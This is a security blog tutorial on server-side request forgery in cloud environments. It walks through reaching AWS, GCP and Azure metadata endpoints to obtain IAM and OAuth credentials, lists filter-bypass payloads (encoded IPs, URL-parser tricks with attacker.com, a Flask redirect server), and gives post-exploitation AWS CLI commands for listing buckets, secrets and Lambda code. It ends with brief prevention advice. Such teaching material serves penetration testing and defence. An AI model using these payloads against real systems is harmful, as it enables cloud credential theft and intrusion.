---
title: "SSRF in Cloud Environments: From URL Fetch to IAM Credentials"
date: 2023-07-22T14:00:00-05:00
draft: false
difficulty: ""
---

SSRF has been around forever, but cloud environments turned it from "you can scan internal ports" into "you can steal IAM credentials and pivot through the entire infrastructure." This post covers the full attack chain: finding SSRF, hitting cloud metadata endpoints, and what you can do once you have credentials.

<!--more-->

## What Makes Cloud SSRF Different

In a traditional environment, SSRF lets you make requests to internal services. You can scan ports, hit internal APIs, maybe read files through a file:// handler. Useful, but limited.

Cloud environments change the game because every instance has access to a metadata service at a known IP address. That service hands out temporary IAM credentials to whatever role is attached to the instance. If you can reach it through SSRF, you get credentials that let you interact with the cloud provider's API as that instance's role.

The metadata endpoints:

```
AWS:   http://169.254.169.254/latest/meta-data/
GCP:   http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

These are link-local addresses. Not routable from the internet. But if you can make the server issue a request to them, you get the response back.

## Finding SSRF

SSRF shows up anywhere the application fetches a URL or resource based on user input. Common injection points:

- URL preview/unfurl features (paste a link, app fetches a thumbnail)
- PDF generators that render HTML from a URL
- Webhook configurations
- File import from URL (upload via URL instead of file)
- Image proxy endpoints
- XML parsing (XXE can chain into SSRF)
- Server-side redirects where you control the destination

The test is simple. Set up a listener (use Burp Collaborator, interactsh, or just a VPS with netcat) and see if the server makes a request to you:

```bash
# On your VPS
nc -lvp 8080

# In the application, submit your URL
http://YOUR_VPS_IP:8080/test
```

If you get a hit, you have outbound SSRF. Now the question is whether you can read the response.

## Blind vs Non-Blind SSRF

**Non-blind**: the server returns the content it fetched. You can directly read the metadata response. This is the best case.

**Blind**: the server makes the request but doesn't show you the response. You know it's making the request (you see the hit on your listener), but you can't read internal resources directly. You can still exploit this through:

- Timing-based port scanning (open ports respond faster than closed ones)
- DNS rebinding to redirect the server's request to internal IPs
- Chaining with other vulnerabilities

## Hitting AWS Metadata

AWS IMDSv1 is the easiest to exploit. No special headers required:

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The first URL lists available metadata categories. The second lists IAM roles attached to the instance. Once you have the role name:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

This returns temporary AWS credentials:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2023-07-22T20:00:00Z"
}
```

With these, you can use the AWS CLI:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# See what you can do
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws iam list-roles
```

**IMDSv2** makes this harder. It requires a PUT request to get a session token first:

```
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
```

Then you use that token as a header in subsequent requests. Most SSRF vulnerabilities only let you control GET requests, so IMDSv2 blocks the attack. But not always. If you find SSRF in a feature that lets you control the HTTP method and headers (like a webhook configuration), you can still exploit it.

## Hitting GCP Metadata

GCP requires the header `Metadata-Flavor: Google` on all metadata requests. Without it, you get a 403.

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google
```

This returns an OAuth access token for the instance's service account. The header requirement blocks basic SSRF, but if you can control request headers (some PDF generators, webhook features, or SSRF through XXE with external DTDs), you can still reach it.

An interesting bypass: if the SSRF follows redirects, host a page on your server that returns a 302 redirect to the metadata URL. Some HTTP clients will carry headers across redirects, some won't. Worth testing.

## Hitting Azure Metadata

Azure requires the header `Metadata: true`:

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true
```

For managed identity tokens:

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true
```

Same header restriction issue as GCP. But Azure has another vector: if the application uses Azure App Service, the managed identity endpoint is different:

```
http://169.254.130.1/MSI/token?api-version=2017-09-01&resource=https://management.azure.com/
Header: Secret: <MSI_SECRET environment variable>
```

The `MSI_SECRET` is available as an environment variable on the instance. If you can chain SSRF with an environment variable disclosure (or LFI to read `/proc/self/environ`), you can hit this endpoint.

## Bypassing SSRF Filters

Applications often implement URL validation to block requests to internal IPs. Common bypasses:

**DNS rebinding**: Register a domain that alternates between resolving to your IP and `169.254.169.254`. The server validates the hostname (sees your IP), then makes the request (gets the metadata IP).

**Alternative IP representations**:

```
http://2852039166/           # 169.254.169.254 as decimal
http://0xa9fea9fe/           # hex
http://0251.0376.0251.0376/  # octal
http://[::ffff:169.254.169.254]/  # IPv6 mapped
http://169.254.169.254.nip.io/    # DNS wildcard service
```

**Redirect bypass**: if the filter only checks the initial URL but the server follows redirects, host a redirect on your server:

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def redir():
    return redirect('http://169.254.169.254/latest/meta-data/')
```

**URL parser inconsistencies**: different parsers handle URLs differently. Try:

```
http://169.254.169.254@attacker.com
http://attacker.com#@169.254.169.254
http://169.254.169.254%00@attacker.com
http://169.254.169.254/latest/meta-data/%2f..%2f
```

**Using enclosed alphanumerics**: `http://⑯⑨.②⑤④.⑯⑨.②⑤④/` (some parsers decode these)

## Post-Exploitation with Stolen Credentials

Once you have cloud credentials, enumerate what they can access:

```bash
# AWS - check your identity and permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ROLE_NAME

# List S3 buckets and try to read them
aws s3 ls
aws s3 ls s3://bucket-name --recursive

# Check for secrets
aws secretsmanager list-secrets
aws ssm describe-parameters

# Check Lambda functions (often contain hardcoded secrets)
aws lambda list-functions
aws lambda get-function --function-name NAME
```

The credentials are temporary (usually 6-12 hours), but that's more than enough time to find permanent access keys, secrets, or pivot further into the environment.

## Prevention

If you're on the defending side:

- Use IMDSv2 on AWS (enforce it, don't just enable it)
- Restrict outbound traffic from application servers
- Validate URLs against a strict allowlist, not a blocklist
- Don't follow redirects when fetching user-supplied URLs
- Run metadata-aware WAF rules
- Use network policies to restrict metadata access to only the processes that need it